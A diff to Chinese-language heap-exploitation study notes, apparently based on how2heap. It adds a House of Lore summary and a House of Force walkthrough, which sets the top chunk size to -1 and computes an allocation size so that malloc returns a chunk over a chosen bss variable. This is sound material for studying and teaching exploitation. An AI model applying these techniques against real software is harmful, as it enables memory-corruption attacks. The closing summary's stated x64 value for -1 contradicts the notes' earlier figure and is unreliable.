@@ -717,7 +717,7 @@ DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
 - [Heap Exploitation: Off-By-One / Poison Null Byte](https://devel0pment.de/?p=688)
 - [Null Byte Poisoning - The Magic Byte](https://0x00sec.org/t/null-byte-poisoning-the-magic-byte/3874)
 
-### House of Lore
+## House of Lore
 
 学heap，还是要很清晰chunk在malloc和free之后会放到哪个bin，以及malloc和free会触发哪些合并和chunk移动。
 
@@ -935,7 +935,203 @@ memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps o
 
 但是改成0x80，会直接放在small bin，故更加直观。
 
+#### 总结
+
+这个攻击是针对small bin chunk进行的，通过堆溢出修改free small chunk的前项指针bk指向栈中伪造的两个双向链接chunk，从而达到分配到栈地址的目的，可以对栈进行攻击。
+
 #### 参考链接
 
 - [CTF wiki——house of lore](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/)
 - [安全客 how2heap](https://www.anquanke.com/post/id/86809)
+
+## House of force
+
+现在不能无目的的学习了，要从做题中来补充攻击方法。这里是**针对top chunk的攻击**
+
+#### 回顾一下malloc的分配过程
+
+- 首先获得分配区的锁，然后计算实际需要分配的chunk大小（考虑对齐和chunk头）
+- 尝试在fast bins中分配
+- 尝试在small bins中分配
+- 操作：整合fast bins到unsorted bin
+- 尝试在unsorted bin中分配
+  - 需分配的大小为属于small bins则切割分配
+  - 否则操作：整合unsorted bin根据chunk大小放入small、large bins（此时fast bins和unsorted bin已清除干净）
+- 尝试在large bins中分配
+- 尝试在top chunk中分配：**判断 top chunk 大小是否满足所需 chunk 的大小， 如果是，则从 top chunk 中分出一块来**。 
+- 如果top chunk 也不能满足分配要求，于是就有了两个选择: 
+  - 如果是主分配区， 调用 sbrk()， 增加 top chunk 大小； 
+  - 如果是非主分配区，调用 mmap来分配一个新的 sub-heap，以增加 top chunk 大小；
+  - 或者使用 mmap()来直接分配。 
+
+#### 攻击原理
+
+House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，**需要以下条件：**
+
+1. 能够以溢出等方式控制到 top chunk 的 size 域
+2. 能够自由地控制堆分配尺寸的大小
+
+House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面malloc分配过程我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。
+
+那么，当<u>使用 top chunk 分配堆块的 size 值是由用户控制的任意值时</u>会发生什么？答案是，<u>可以使得 top chunk 指向我们期望的任何位置</u>，这就**相当于一次任意地址写**。
+
+然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证
+
+```c++
+// 获取当前的top chunk，并计算其对应的大小
+victim = av->top;
+size   = chunksize(victim);
+// nb为对齐并加chunk头后当前需求分配的大小
+// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
+// top chunk 的大小 - 当前拟分配nb = 剩下的大小还是>=最小的可能chunk
+if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
+{
+    remainder_size = size - nb;
+    remainder      = chunk_at_offset(victim, nb); 
+    av->top        = remainder; //remainder作为分配后剩余的top chunk
+    set_head(victim, nb | PREV_INUSE |
+            (av != &main_arena ? NON_MAIN_ARENA : 0));
+    set_head(remainder, remainder_size | PREV_INUSE);
+
+    check_malloced_chunk(av, victim, nb);
+    void *p = chunk2mem(victim);
+    alloc_perturb(p, bytes);
+    return p;
+}
+```
+
+然而，**如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证**，这也就是我们前面说的<u>需要一个能够控制 top chunk size 域的漏洞</u>。
+
+```c++
+(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
+```
+
+<u>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证</u>。
+
+```c++
+remainder      = chunk_at_offset(victim, nb); //也就是说如果nb通过验证，就可以使得remainder指向指定位置
+//计算此后的top chunk的位置仅仅简单通过victim + nb，那么下次切割top chunk就从victim + nb开始。我们可以通过控制nb来控制top chunk更新后的位置
+av->top        = remainder;
+
+/* Treat space at ptr + offset as a chunk */
+#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
+```
+
+之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。
+
+**与此同时，我们需要注意的是，topchunk 的 size 也会更新，其更新的方法如下**
+
+```c++
+victim = av->top;
+size   = chunksize(victim);
+remainder_size = size - nb;
+set_head(remainder, remainder_size | PREV_INUSE);
+```
+
+所以，<u>如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于x+MINSIZE</u>。
+
+#### 攻击实现
+
+**house_of_force**的主要思想是，通过改写top chunk来使malloc返回任意地址【可以在bss，可以在栈上】。
+
+top chunk是一块非常特殊的内存，它存在于堆区的最后，而且一般情况下【尤其是在heap初始使用的时候】，当malloc向os申请内存时，top chunk的大小会变动。
+
+攻击目的：利用house_of_force实现改写一个bss的变量
+
+```c++
+char bss_var[]= "This is a string that we want to overwrite.";
+```
+
+先分配第一个chunk：
+
+```c++
+intptr_t *p1 = malloc(256); //chunk头地址在0x190e000
+```
+
+![第一个chunk的情况](/img/how2heap/houseoff.png)
+
+###### Wilderness
+
+The topmost chunk is also known as the 'wilderness'. It borders the end of the heap (i.e. it is at the maximum address within the heap) and is not present in any bin. 
+
+现在heap区域就存在了两个chunk一个是p1,一个是top chunk。
+
+![](/img/how2heap/houseoff1.png)
+
+现在模拟一个漏洞，改写top chunk的头部，top chunk的起始地址为：
+
+```c++
+intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
+```
+
+用一个很大的值来改写top chunk的size【通过堆溢出等可以控制top chunk的size字段】，使得top chunk足够分配很大的chunk，以免等一下申请内存的时候使用**mmap**来分配：
+
+```c++
+*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
+//top chunk头地址 + 8B = size字段
+```
+
+改写之后top chunk的size=0xFFFFFFFFFFFFFFFF。
+
+<u>现在top chunk变得非常大，我们可以malloc一个在此范围内的任何大小的内存而不用调用mmap。</u>
+
+我们希望的是通过调用malloc在任意位置分配一个chunk，从可以控制这个分配的区域。
+
+接下来的操作就是使得malloc一个chunk【切割top chunk】，使得这个chunk刚好分配到我们想控制的那块区域为止，然后我们就可以再次malloc，即再次切割top chunk，得到我们想控制的区域了。
+
+比如：我们想要改写的变量位置在`0x602060`，top chunk 的位置在`0x190e110`，再算上chunk 头的大小，我们将要malloc `0xfffffffffecf3f30`个字节。
+
+```c++
+unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
+//bss_var - 2*8B = chunk top头地址ptr_top + 2*8B + evil_size
+```
+
+![布局如下](/img/how2heap/houseoff2.png)
+
+```c++
+void *new_ptr = malloc(evil_size);
+fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);
+//As expected, the new pointer is at the same place as the old top chunk: 0x190e110
+//原top chunk的chunk头地址为0x190e110
+```
+
+新申请的这个chunk开始于原来top chunk所处的位置。
+
+而此时top chunk已经处在`0x602050`了【bss_var - 16B】，之后再malloc就会返回一个包含我们想要改写的变量的chunk了。
+
+接下来对分配的bss chunk进行写入。
+
+```c++
+void* ctr_chunk = malloc(100);
+fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
+fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk); //malloc(100) => 0x602060!
+fprintf(stderr, "Now, we can finally overwrite that value:\n");
+
+fprintf(stderr, "... old string: %s\n", bss_var);
+//... old string: This is a string that we want to overwrite.
+fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
+strcpy(ctr_chunk, "YEAH!!!");//对分配的chunk进行写入
+fprintf(stderr, "... new string: %s\n", bss_var);
+//... new string: YEAH!!!
+```
+
+#### 总结
+
+<u>这个例程和它的名字一样暴力，直接对top chunk下手，想法很大胆的一种攻击方式。</u>
+
+首先是修改top chunk的size字段为-1（在x64机器上实际大小就为0xFFFFFFFF）
+
+然后malloc一个很大的值**Large**，L的计算就是用你想控制的地址的值**Ctrl_addr**减去top地址的值**Top**，那么Large = Ctrl – Top 。
+
+```
+malloc(Large);
+```
+
+用malloc申请了这个chunk之后top chunk则被设置到Ctrl_addr，再次分配则可得到该地址下的可控chunk
+
+#### 参考链接
+
+- [House of force from CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/)
+- [House of force from 安全客](https://www.anquanke.com/post/id/86809)
+- [The Malloc Maleficarum](https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt)
+- [House of force from heap-exploitation](https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html)
